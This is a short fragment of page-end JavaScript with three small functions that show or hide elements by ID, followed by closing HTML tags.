function yue30() {
    var yue8888 = document.getElementById("yue8888");
    yue8888.style.display="none";
}
function yue99() {
    var yue999 = document.getElementById("yue999");
    yue999.style.display="";
}
function yue90() {
    var yue999 = document.getElementById("yue999");
    yue999.style.display="none";
}


</script>>
</div></div></div></body></html>
